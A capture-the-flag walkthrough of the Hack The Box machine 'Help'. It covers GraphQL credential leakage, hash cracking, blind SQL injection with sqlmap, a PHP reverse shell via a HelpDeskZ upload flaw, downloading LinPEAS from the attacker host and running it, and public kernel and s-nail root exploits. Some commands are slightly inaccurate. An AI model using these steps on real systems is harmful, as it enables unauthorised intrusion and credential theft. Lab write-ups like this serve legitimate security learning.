# HTB Machine: Help

## Overview
Help is a Linux machine running a vulnerable HelpDeskZ application that provides multiple attack vectors for initial access. The machine features a GraphQL endpoint that leaks credentials, a blind SQL injection vulnerability, and an unauthenticated file upload in HelpDeskZ. Privilege escalation is achieved through either a vulnerable s-nail setuid binary or a kernel exploit.

## Reconnaissance

### Port Scanning
I began with a comprehensive port scan to identify open services:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.159 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.230.159 -oN nmap
```

**Open Ports:**
- **22/tcp** - OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
- **80/tcp** - Apache httpd 2.4.18
- **3000/tcp** - Node.js Express framework

I added `help.htb` to my `/etc/hosts` file:
```bash
echo "10.129.230.159 help.htb" | sudo tee -a /etc/hosts
```

### Subdomain and Vhost Enumeration
I attempted to find subdomains and vhosts, but both scans returned nothing:

```bash
ffuf -u http://FUZZ.help.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://10.129.230.159 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.help.htb" -fs 11439
```

### Directory Enumeration
I ran directory brute-forcing to discover hidden paths:

```bash
feroxbuster -u http://help.htb -o feroxbuster
```

The web application was built on PHP, with several interesting endpoints discovered.

## Web Application Enumeration

### help.htb (Port 80)
The main site showed an Apache Ubuntu default page. 

<img width="1279" height="729" alt="image" src="https://github.com/user-attachments/assets/59eb143c-1253-4130-85af-d1a721468e73" />

Further exploration revealed:

- **/support** - A HelpDeskZ installation (login page)
<img width="1278" height="595" alt="image" src="https://github.com/user-attachments/assets/fec578ac-c036-4a6a-ba1e-18d9c3f024c3" />

- **/support/controllers/admin** 
  <img width="633" height="432" alt="image" src="https://github.com/user-attachments/assets/88271ab8-7a57-4cfb-bf1d-a04e15d23e81" />

- **/support/controllers/staff** 
  <img width="600" height="583" alt="image" src="https://github.com/user-attachments/assets/3d722a50-3f9e-4511-8c24-1e22d39f85a6" />

- **/support/README.md** - Revealed version 1.0.2
  <img width="458" height="152" alt="image" src="https://github.com/user-attachments/assets/a1dc6cbe-b359-4dab-9736-c53422f78f10" />


The login page displayed generic messages for both email and password, making username enumeration difficult.

<img width="1269" height="569" alt="image" src="https://github.com/user-attachments/assets/b60dfd48-9175-4cee-bbbe-d34fab8ec2e6" />


The **/lost_password** page included a CAPTCHA, further hindering enumeration attempts.

<img width="1279" height="649" alt="image" src="https://github.com/user-attachments/assets/8faa1955-d6e6-47a0-ad29-4383176b979b" />


The **/knowledgebase** page returned generic messages when articles weren't found.

<img width="1279" height="608" alt="image" src="https://github.com/user-attachments/assets/bb3aaaf1-6265-4ef0-aca3-a23ce5c0f070" />


The **/news** page revealed an email address: `support@help.htb`

<img width="1278" height="626" alt="image" src="https://github.com/user-attachments/assets/bcdcafaa-48df-47fe-8510-30cf3180b904" />


### Port 3000 - GraphQL Endpoint
The Node.js application on port 3000 had a GraphQL endpoint. By manipulating the query parameter, I discovered I could access the GraphQL introspection system:

```
http://10.129.230.159:3000/graphql?query=
```

Setting an introspection query revealed the schema:
```graphql
{
  "__schema" {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

Visualizing the introspection data revealed a query for user credentials. I crafted a specific query to extract them:

```graphql
{
  user(where:{id:1}){
    email
    password
  }
}
```

The response contained:
```json
{
  "data": {
    "user": {
      "email": "helpme@helpme.com",
      "password": "$2a$10$yIoLVnMwRSOiRq.g4Fy5M.kp8bXsNWWRW/d3DgG7VJxS9LBSNL7Qm"
    }
  }
}
```

The hash was a bcrypt password. I cracked it using hashcat:
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
**Password: godhelpmeplz**

## Initial Access

I discovered two distinct paths to gain initial access to the machine.

### Method 1: SQL Injection

#### Discovering the Vulnerability
After logging into the support panel with the GraphQL credentials, I created a ticket and clicked on the attachment. The URL parameter caught my attention:

```
http://help.htb/support/uploads/tickets/<ticket_id>.html
```

I tested for SQL injection by modifying the parameter. When I changed it to `1=1`, the page loaded normally. When I changed it to `1=2`, the page returned empty, confirming a blind SQL injection vulnerability.

#### Exploiting with SQLMap
I saved the request to a file and ran SQLMap:

```bash
sqlmap -r req.req
sqlmap -r req.req --batch --level 3 --risk 3 --dbs
```

This revealed the `support` database. I enumerated its tables:

```bash
sqlmap -r req.req --batch --level 3 --risk 3 -D support --tables -t 10
```

The `staff` table looked promising. I dumped its contents:

```bash
sqlmap -r req.req -D support -T staff --dump
```

This revealed a hashed password for the `help` user. I cracked it:
```
Password: Welcome1
```

#### Finding the Username
I needed the correct username for SSH. I used CrackMapExec to brute-force usernames:

```bash
crackmapexec ssh 10.129.230.159 -u /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -p Welcome1
```

This confirmed the username was `help`. I then connected via SSH and retrieved the user flag:

```bash
ssh help@10.129.230.159
Password: Welcome1
cat user.txt
```

### Method 2: Unauthenticated File Upload

#### Vulnerability Research
The HelpDeskZ version 1.0.2 is vulnerable to an unauthenticated file upload vulnerability. I found a public exploit:

```bash
git clone https://github.com/JubJubMcGrub/HelpDeskZ-1.0.2-File-Uplaod
```

#### Exploitation
I created a PHP reverse shell from PentestMonkey and uploaded it through the ticket system. Despite the application showing a "File is not allowed" message, the file was successfully uploaded:

```bash
# Set up listener
nc -lvnp 4444

# Upload the reverse shell through the vulnerable endpoint
# The file was uploaded to /support/uploads/tickets/<filename>
```

After accessing the uploaded file, I received a shell and retrieved the user flag:

```bash
cat /home/help/user.txt
```

## Privilege Escalation

### Initial Enumeration
I transferred LinPEAS to the target for automated enumeration:

```bash
# On attack machine
python3 -m http.server 8000

# On target
wget http://10.10.14.157:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**System Information:**
- OS: Ubuntu 16.04.3 LTS
- Kernel: Linux version 4.4.0-116-generic
- User: help (uid=1000) with groups: adm, cdrom, dip, www-data, plugdev, lpadmin, sambashare
- Sudo version: 1.8.16

`sudo -l` showed nothing useful.

### Method 1: s-nail Privilege Escalation (CVE-2017-5899)

#### Identifying the Vulnerability
While checking setuid binaries, I found an interesting one:

```bash
find / -perm -4000 2>/dev/null
```

Output included:
```
/usr/lib/s-nail/s-nail-privsep
```

I checked the s-nail version:
```bash
s-nail -V
```
**Version: v14.8.6**

This version is vulnerable to CVE-2017-5899, a privilege escalation vulnerability in the setuid helper.

#### Exploitation
I found a public exploit and transferred it to the target:

```bash
# Download the exploit
wget https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh

# Transfer to target
scp exploit.sh help@10.129.230.159:/home/help/

# On target
chmod +x exploit.sh
./exploit.sh
```

The exploit successfully executed, granting a root shell.

### Method 2: Kernel Exploit (CVE-2017-16995)

#### Identifying the Vulnerability
The kernel version (4.4.0-116-generic) is vulnerable to CVE-2017-16995, a privilege escalation vulnerability in the Linux kernel's Berkeley Packet Filter (BPF) subsystem.

#### Exploitation
I downloaded the exploit from Exploit-DB:

```bash
wget https://www.exploit-db.com/exploits/44298 -O 44298.c
```

I transferred it to the target and compiled it:

```bash
scp 44298.c help@10.129.230.159:/home/help/

# On target
gcc 44298.c -o cve-2017-16995
./cve-2017-16995
```

The exploit executed successfully, spawning a root shell.

### Root Flag
With root access achieved through either method, I retrieved the final flag:

```bash
cat /root/root.txt
```
